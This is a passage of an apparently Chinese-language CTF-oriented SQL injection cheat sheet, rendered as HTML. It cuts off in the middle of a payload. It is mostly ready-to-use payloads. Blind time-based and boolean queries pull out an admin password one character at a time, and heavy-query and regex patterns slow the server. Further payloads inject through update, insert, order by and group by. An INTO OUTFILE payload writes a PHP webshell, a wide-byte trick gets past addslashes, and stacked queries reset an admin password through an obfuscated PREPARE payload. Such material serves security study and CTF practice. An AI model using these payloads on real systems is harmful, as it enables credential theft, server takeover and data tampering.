+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>(<span style="color:#fff;font-weight:bold">and</span> | <span style="color:#fff;font-weight:bold">or</span>) (<span style="color:#fff;font-weight:bold">case</span> <span style="color:#fff;font-weight:bold">when</span> (<span style="color:#fff;font-weight:bold">select</span> substr(password,<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">1</span>) <span style="color:#fff;font-weight:bold">from</span> users)=<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span> <span style="color:#fff;font-weight:bold">then</span> pg_sleep(<span style="color:#ff0;font-weight:bold">5</span>) <span style="color:#fff;font-weight:bold">else</span> pg_sleep(<span style="color:#ff0;font-weight:bold">0</span>) <span style="color:#fff;font-weight:bold">end</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">and</span> (<span style="color:#fff;font-weight:bold">select</span> <span style="color:#fff;font-weight:bold">case</span> <span style="color:#fff;font-weight:bold">when</span>(substr((<span style="color:#fff;font-weight:bold">select</span> password <span style="color:#fff;font-weight:bold">from</span> users <span style="color:#fff;font-weight:bold">where</span> username=<span style="color:#0ff;font-weight:bold">&#39;admin&#39;</span>),<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">1</span>)=<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>) <span style="color:#fff;font-weight:bold">then</span> (<span style="color:#fff;font-weight:bold">select</span> <span style="color:#0ff;font-weight:bold">&#39;roarctf&#39;</span> <span style="color:#fff;font-weight:bold">from</span> pg_sleep(<span style="color:#ff0;font-weight:bold">3</span>)) <span style="color:#fff;font-weight:bold">else</span> <span style="color:#0ff;font-weight:bold">&#39;1&#39;</span> <span style="color:#fff;font-weight:bold">end</span>)=<span style="color:#0ff;font-weight:bold">&#39;roarctf&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#007f7f">-- 笛卡尔积 heavy query
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">select</span> * <span style="color:#fff;font-weight:bold">from</span> users <span style="color:#fff;font-weight:bold">where</span> id=<span style="color:#ff0;font-weight:bold">1</span> <span style="color:#fff;font-weight:bold">and</span> <span style="color:#ff0;font-weight:bold">1</span>&gt;(<span style="color:#fff;font-weight:bold">select</span> <span style="color:#fff;font-weight:bold">count</span>(*) <span style="color:#fff;font-weight:bold">from</span> information_schema.columns A, information_schema.columns B, information_schema.columns <span style="color:#fff;font-weight:bold">C</span>);
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">select</span> * <span style="color:#fff;font-weight:bold">from</span> users <span style="color:#fff;font-weight:bold">where</span> id=<span style="color:#ff0;font-weight:bold">1</span> <span style="color:#fff;font-weight:bold">and</span> <span style="color:#fff;font-weight:bold">if</span>(<span style="color:#ff0;font-weight:bold">1</span>,concat(rpad(<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">999999</span>,<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>),rpad(<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">999999</span>,<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>),rpad(<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">999999</span>,<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>),rpad(<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">999999</span>,<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>),rpad(<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">999999</span>,<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>),rpad(<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">999999</span>,<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>),rpad(<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">999999</span>,<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>),rpad(<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">999999</span>,<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>),rpad(<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">999999</span>,<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>),rpad(<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">999999</span>,<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>),rpad(<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">999999</span>,<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>),rpad(<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">999999</span>,<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>),rpad(<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">999999</span>,<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>),rpad(<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">999999</span>,<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>),rpad(<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">999999</span>,<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>),rpad(<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">999999</span>,<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>)) RLIKE <span style="color:#0ff;font-weight:bold">&#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;</span>,<span style="color:#ff0;font-weight:bold">0</span>) <span style="color:#fff;font-weight:bold">and</span> <span style="color:#0ff;font-weight:bold">&#39;1&#39;</span>=<span style="color:#0ff;font-weight:bold">&#39;1&#39;</span>;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="基于布尔盲注">基于布尔盲注<a hidden class="anchor" aria-hidden="true" href="#基于布尔盲注">#</a></h3>
+<p>使用场景：<strong>对真/假条件返回的内容很容易区分</strong>。</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>(<span style="color:#fff;font-weight:bold">where</span> | <span style="color:#fff;font-weight:bold">and</span>) <span style="color:#fff;font-weight:bold">if</span>(substr((<span style="color:#fff;font-weight:bold">select</span> password <span style="color:#fff;font-weight:bold">from</span> users <span style="color:#fff;font-weight:bold">where</span> username=<span style="color:#0ff;font-weight:bold">&#39;admin&#39;</span>),<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">1</span>)=<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>,<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">select</span> * <span style="color:#fff;font-weight:bold">from</span> users <span style="color:#fff;font-weight:bold">where</span> username=nouser <span style="color:#fff;font-weight:bold">or</span> <span style="color:#fff;font-weight:bold">length</span>(<span style="color:#fff;font-weight:bold">database</span>())&gt;<span style="color:#ff0;font-weight:bold">8</span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">select</span> * <span style="color:#fff;font-weight:bold">from</span> users <span style="color:#fff;font-weight:bold">where</span> username=nouser <span style="color:#fff;font-weight:bold">or</span> ascii(substr(<span style="color:#fff;font-weight:bold">database</span>(),<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">1</span>))&lt;<span style="color:#ff0;font-weight:bold">130</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#007f7f">-- 通配符
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">select</span> * <span style="color:#fff;font-weight:bold">from</span> users <span style="color:#fff;font-weight:bold">where</span> username=<span style="color:#0ff;font-weight:bold">&#39;xxx&#39;</span> <span style="color:#fff;font-weight:bold">and</span> passwd=<span style="color:#0ff;font-weight:bold">&#39;-1&#39;</span> <span style="color:#fff;font-weight:bold">or</span> passwd <span style="color:#fff;font-weight:bold">like</span> <span style="color:#0ff;font-weight:bold">&#39;{}%&#39;</span>#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="基于sql增删改查的盲注">基于sql增删改查的盲注<a hidden class="anchor" aria-hidden="true" href="#基于sql增删改查的盲注">#</a></h3>
+<h4 id="update注入">update注入<a hidden class="anchor" aria-hidden="true" href="#update注入">#</a></h4>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>#<span style="color:#f00">盲注</span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">update</span> users <span style="color:#fff;font-weight:bold">set</span> username = <span style="color:#0ff;font-weight:bold">&#39;0&#39;</span>|<span style="color:#fff;font-weight:bold">if</span>((substr(<span style="color:#fff;font-weight:bold">user</span>(),<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">1</span>) regexp <span style="color:#ff0;font-weight:bold">0</span>x5e5b6d2d7a5d), sleep(<span style="color:#ff0;font-weight:bold">5</span>), <span style="color:#ff0;font-weight:bold">1</span>) <span style="color:#fff;font-weight:bold">where</span> id=<span style="color:#ff0;font-weight:bold">15</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">update</span> users <span style="color:#fff;font-weight:bold">set</span> username = <span style="color:#0ff;font-weight:bold">&#39;0&#39;</span> | (substr(<span style="color:#fff;font-weight:bold">user</span>(),<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">1</span>) regexp <span style="color:#ff0;font-weight:bold">0</span>x5e5b6d2d7a5d) <span style="color:#fff;font-weight:bold">where</span> id=<span style="color:#ff0;font-weight:bold">14</span>;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="insert注入">insert注入<a hidden class="anchor" aria-hidden="true" href="#insert注入">#</a></h4>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>#<span style="color:#f00">盲注</span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">insert</span> <span style="color:#fff;font-weight:bold">into</span> users <span style="color:#fff;font-weight:bold">values</span> (<span style="color:#ff0;font-weight:bold">16</span>,<span style="color:#0ff;font-weight:bold">&#39;K0rz3n&#39;</span>,<span style="color:#0ff;font-weight:bold">&#39;0&#39;</span>| <span style="color:#fff;font-weight:bold">if</span>((substr(<span style="color:#fff;font-weight:bold">user</span>(),<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">1</span>) regexp <span style="color:#ff0;font-weight:bold">0</span>x5e5b6d2d7a5d), sleep(<span style="color:#ff0;font-weight:bold">5</span>), <span style="color:#ff0;font-weight:bold">1</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">insert</span> <span style="color:#fff;font-weight:bold">into</span> users <span style="color:#fff;font-weight:bold">values</span> (<span style="color:#ff0;font-weight:bold">15</span>,<span style="color:#0ff;font-weight:bold">&#39;K0rz3n&#39;</span>,<span style="color:#0ff;font-weight:bold">&#39;0&#39;</span>| (substr(<span style="color:#fff;font-weight:bold">user</span>(),<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">1</span>) regexp <span style="color:#ff0;font-weight:bold">0</span>x5e5b6d2d7a5d));
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="order-by-注入">order by 注入<a hidden class="anchor" aria-hidden="true" href="#order-by-注入">#</a></h4>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>#<span style="color:#f00">报错注入</span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">select</span> * <span style="color:#fff;font-weight:bold">from</span> users <span style="color:#fff;font-weight:bold">order</span> <span style="color:#fff;font-weight:bold">by</span> updatexml(<span style="color:#ff0;font-weight:bold">1</span>,concat(<span style="color:#ff0;font-weight:bold">0</span>x7e,(<span style="color:#fff;font-weight:bold">select</span>%<span style="color:#ff0;font-weight:bold">20</span><span style="color:#fff;font-weight:bold">user</span>()),<span style="color:#ff0;font-weight:bold">0</span>x7e),<span style="color:#ff0;font-weight:bold">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>#<span style="color:#f00">盲注</span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">select</span> * <span style="color:#fff;font-weight:bold">from</span> users <span style="color:#fff;font-weight:bold">order</span> <span style="color:#fff;font-weight:bold">by</span> id ^(<span style="color:#fff;font-weight:bold">select</span>(<span style="color:#fff;font-weight:bold">select</span> <span style="color:#fff;font-weight:bold">version</span>()) regexp <span style="color:#0ff;font-weight:bold">&#39;^5&#39;</span>);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="group-by-注入">Group by 注入<a hidden class="anchor" aria-hidden="true" href="#group-by-注入">#</a></h4>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>#<span style="color:#f00">盲注</span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">select</span> * <span style="color:#fff;font-weight:bold">from</span> users <span style="color:#fff;font-weight:bold">group</span> <span style="color:#fff;font-weight:bold">by</span> <span style="color:#ff0;font-weight:bold">1</span> <span style="color:#fff;font-weight:bold">having</span> substr((<span style="color:#fff;font-weight:bold">select</span> <span style="color:#fff;font-weight:bold">database</span>()),<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">1</span>)=<span style="color:#0ff;font-weight:bold">&#39;c&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="文件写入">文件写入<a hidden class="anchor" aria-hidden="true" href="#文件写入">#</a></h2>
+<ul>
+<li>我们可以通过sql语句实现写入webshell，从而可以远程通过菜刀、冰蝎等工具建立连接。</li>
+<li>当然，文件写入的条件比较特殊
+<ul>
+<li>数据库当前用户为root权限；</li>
+<li>知道当前网站的绝对路径；</li>
+<li><code>PHP</code>的<code>GPC</code>为 off状态；(魔术引号，GET，POST，Cookie)</li>
+<li>写入的那个路径存在写入权限。</li>
+</ul>
+</li>
+</ul>
+<h3 id="基于联合查询">基于联合查询<a hidden class="anchor" aria-hidden="true" href="#基于联合查询">#</a></h3>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">SELECT</span> <span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#0ff;font-weight:bold">&#39;&lt;?php phpinfo();?&gt;&#39;</span>,<span style="color:#ff0;font-weight:bold">3</span> <span style="color:#fff;font-weight:bold">into</span> outfile <span style="color:#0ff;font-weight:bold">&#39;C:\info.php&#39;</span>%<span style="color:#ff0;font-weight:bold">23</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>?id=<span style="color:#ff0;font-weight:bold">1</span> <span style="color:#fff;font-weight:bold">UNION</span> <span style="color:#fff;font-weight:bold">ALL</span> <span style="color:#fff;font-weight:bold">SELECT</span> <span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#0ff;font-weight:bold">&#39;&lt;?php phpinfo();?&gt;&#39;</span>,<span style="color:#ff0;font-weight:bold">3</span> <span style="color:#fff;font-weight:bold">into</span> dumpfile <span style="color:#0ff;font-weight:bold">&#39;C:\info.php&#39;</span>%<span style="color:#ff0;font-weight:bold">23</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="非联合查询">非联合查询<a hidden class="anchor" aria-hidden="true" href="#非联合查询">#</a></h3>
+<p>当我们无法使用联合查询时，我们可以使用<code>fields terminated by</code>与<code>lines terminated by</code>来写shell：<code>?id=1 into outfile 'C:\info.php' FIELDS TERMINATED BY '&lt;?php phpinfo();?&gt;'%23</code></p>
+<h2 id="宽字节注入">宽字节注入<a hidden class="anchor" aria-hidden="true" href="#宽字节注入">#</a></h2>
+<p>国内最常使用的 GBK 编码，这种方式主要是绕过 <code>addslashes</code> 等对特殊字符进行转移的绕过。反斜杠 <code>\</code> 的十六进制为 <code>%5c</code>，在你输入 <code>%bf%27</code> 时，函数遇到单引号自动转移加入 <code>\</code>，此时变为 <code>%bf%5c%27</code>，<code>%bf%5c</code> 在 GBK 中变为一个宽字符「縗」。<strong><code>%bf</code></strong> 那个位置可以是 <code>%81-%fe</code> 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。</p>
+<p>GET方式：利用URLencode <code>?id=1%df'||1={payload}%23</code></p>
+<p>POST方式：利用UTF-16或UTF-32或中文 <code>?id=1我'||1={payload}#</code></p>
+<h2 id="堆叠注入">堆叠注入<a hidden class="anchor" aria-hidden="true" href="#堆叠注入">#</a></h2>
+<p>由于分号<code>;</code>为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如<code>RENAME</code>、<code>DROP</code>等。</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff0;font-weight:bold">1</span>;<span style="color:#fff;font-weight:bold">show</span> databases;#
+</span></span><span style="display:flex;"><span><span style="color:#ff0;font-weight:bold">1</span>;<span style="color:#fff;font-weight:bold">show</span> tables;#
+</span></span><span style="display:flex;"><span><span style="color:#ff0;font-weight:bold">1</span>;<span style="color:#fff;font-weight:bold">show</span> columns <span style="color:#fff;font-weight:bold">from</span> [<span style="color:#f00">表名</span>];#
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff0;font-weight:bold">1</span>;<span style="color:#fff;font-weight:bold">update</span>`ctfshow_user`<span style="color:#fff;font-weight:bold">set</span>`pass`=(<span style="color:#ff0;font-weight:bold">0</span>x31323334)<span style="color:#fff;font-weight:bold">where</span>(username=<span style="color:#ff0;font-weight:bold">0</span>x61646d696e)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#007f7f">/*预处理*/</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff0;font-weight:bold">1</span>;<span style="color:#fff;font-weight:bold">PREPARE</span> hacker <span style="color:#fff;font-weight:bold">from</span> <span style="color:#fff;font-weight:bold">char</span>(<span style="color:#ff0;font-weight:bold">117</span>,<span style="color:#ff0;font-weight:bold">112</span>,<span style="color:#ff0;font-weight:bold">100</span>,<span style="color:#ff0;font-weight:bold">97</span>,<span style="color:#ff0;font-weight:bold">116</span>,<span style="color:#ff0;font-weight:bold">101</span>,<span style="color:#ff0;font-weight:bold">96</span>,<span style="color:#ff0;font-weight:bold">99</span>,<span style="color:#ff0;font-weight:bold">116</span>,<span style="color:#ff0;font-weight:bold">102</span>,<span style="color:#ff0;font-weight:bold">115</span>,<span style="color:#ff0;font-weight:bold">104</span>,<span style="color:#ff0;font-weight:bold">111</span>,<span style="color:#ff0;font-weight:bold">119</span>,<span style="color:#ff0;font-weight:bold">95</span>,<span style="color:#ff0;font-weight:bold">117</span>,<span style="color:#ff0;font-weight:bold">115</span>,<span style="color:#ff0;font-weight:bold">101</span>,<span style="color:#ff0;font-weight:bold">114</span>,<span style="color:#ff0;font-weight:bold">96</span>,<span style="color:#ff0;font-weight:bold">115</span>,<span style="color:#ff0;font-weight:bold">101</span>,<span style="color:#ff0;font-weight:bold">116</span>,<span style="color:#ff0;font-weight:bold">96</span>,<span style="color:#ff0;font-weight:bold">112</span>,<span style="color:#ff0;font-weight:bold">97</span>,<span style="color:#ff0;font-weight:bold">115</span>,<span style="color:#ff0;font-weight:bold">115</span>,<span style="color:#ff0;font-weight:bold">96</span>,<span style="color:#ff0;font-weight:bold">61</span>,<span style="color:#ff0;font-weight:bold">40</span>,<span style="color:#ff0;font-weight:bold">48</span>,<span style="color:#ff0;font-weight:bold">120</span>,<span style="color:#ff0;font-weight:bold">51</span>,<span style="color:#ff0;font-weight:bold">49</span>,<span style="color:#ff0;font-weight:bold">51</span>,<span style="color:#ff0;font-weight:bold">50</span>,<span style="color:#ff0;font-weight:bold">51</span>,<span style="color:#ff0;font-weight:bold">51</span>,<span style="color:#ff0;font-weight:bold">51</span>,<span style="color:#ff0;font-weight:bold">52</span>,<span style="color:#ff0;font-weight:bold">41</span>,<span style="color:#ff0;font-weight:bold">119</span>,<span style="color:#ff0;font-weight:bold">104</span>,<span style="color:#ff0;font-weight:bold">101</span>,<span style="color:#ff0;font-weight:bold">114</span>,<span style="color:#ff0;font-weight:bold">101</span>,<span style="color:#ff0;font-weight:bold">40</span>,<span style="color:#ff0;font-weight:bold">117</span>,<span style="color:#ff0;font-weight:bold">115</span>,<span style="color:#ff0;font-weight:bold">101</span>,<span style="color:#ff0;font-weight:bold">114</span>,<span style="color:#ff0;font-weight:bold">110</span>,<span style="color:#ff0;font-weight:bold">97</span>,<span style="color:#ff0;font-weight:bold">109</span>,<span style="color:#ff0;font-weight:bold">101</span>,<span style="color:#ff0;font-weight:bold">61</span>,<span style="color:#ff0;font-weight:bold">48</span>,<span style="color:#ff0;font-weight:bold">120</span>,<span style="color:#ff0;font-weight:bold">54</span>,<span style="color:#ff0;font-weight:bold">49</span>,<span style="color:#ff0;font-weight:bold">54</span>,<span style="color:#ff0;font-weight:bold">52</span>,<span style="color:#ff0;font-weight:bold">54</span>,<span style="color:#ff0;font-weight:bold">100</span>,<span 